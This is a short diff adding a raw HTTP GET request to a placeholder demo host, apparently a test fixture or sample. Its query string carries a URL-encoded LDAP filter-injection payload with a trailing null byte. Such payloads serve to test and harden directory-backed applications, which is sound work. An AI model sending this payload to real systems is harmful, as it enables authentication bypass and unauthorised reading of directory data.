@@ -1,0 +1,4 @@
+GET /a?q=%2A%29%28uid%3D%2A%29%29%2500 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
